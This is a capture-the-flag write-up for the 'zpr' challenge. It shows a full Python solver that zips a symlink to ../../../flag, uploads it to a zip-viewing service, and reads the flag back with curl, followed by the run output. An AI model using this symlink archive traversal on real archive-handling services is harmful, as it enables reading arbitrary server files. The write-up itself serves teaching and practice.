## zpr

<details>
  <summary>Description</summary>
  
  > My colleague built a service which shows the contents of a zip file. He says there's nothing to worry about.... <br>
  > http://52.59.124.14:10015 + http://52.59.124.14:10016
  
  > [chall.zip](./chall.zip)
  
</details>

Create an txt file `coba.txt` that has text `../../../flag` indicate as the path. The soft link will refer to the original file, so changes made to the original file will also be visible in the symlink.

Then zip into file named `test.zip` that contains the file `coba.txt`. The --symlink argument in this command indicates that the soft link coba.txt will be included in the zip file. Send the test.zip file to the server using the POST method with the help of the curl library.

Make an HTTP GET request to the server `https://52.59.124.14:10016` to access the file `coba.txt` located in the directory. In the HTTP request header, the -v argument in the curl command indicates that the displayed output will include verbose information about the HTTP request process. Therefore, in addition to the contents of the coba.txt file, the output of the curl command will display information such as status code, header, and server response time.

Final script solver

```python3
import os
import requests

os.system('ln -sfn ../../../flag coba.txt')
os.system('zip test.zip coba.txt --symlink')

files = {'file': ('test.zip', open('test.zip', 'rb'), 'application/zip')}
response = requests.post('http://52.59.124.14:10015/', files=files)

print(response.text)

if "coba.txt" in response.text:
    filepath = response.text.strip()
    filepath_parts = filepath.split("/")
    directory = filepath_parts[-2]
    url = f"http://52.59.124.14:10016/{directory}/coba.txt"
    os.system(f"curl -v {url}")
```

Running

```bash
$ python3 solver.py
updating: coba.txt (stored 0%)
Found a file: /tmp/data/eef19175f624ce410f0eb8aff0e87525/bd361131b238f364b10edcc61a356ff9.zip
Found a file: /tmp/data/eef19175f624ce410f0eb8aff0e87525/coba.txt
Find your files at http://...:8088/eef19175f624ce410f0eb8aff0e87525/

*   Trying 52.59.124.14:10016...
* Connected to 52.59.124.14 (52.59.124.14) port 10016 (#0)
> GET /eef19175f624ce410f0eb8aff0e87525/coba.txt HTTP/1.1
> Host: 52.59.124.14:10016
> User-Agent: curl/7.81.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: SimpleHTTP/0.6 Python/3.11.2
< Date: Fri, 10 Mar 2023 12:57:01 GMT
< Content-type: text/plain
< Content-Length: 46
< Last-Modified: Thu, 09 Mar 2023 09:00:53 GMT
<
ENO{Z1pF1L3s_C4N_B3_Dangerous_so_b3_c4r3ful!}
* Closing connection 0
```

<details>
  <summary>Flag</summary>
  
  > `ENO{Z1pF1L3s_C4N_B3_Dangerous_so_b3_c4r3ful!}`
  
</details>
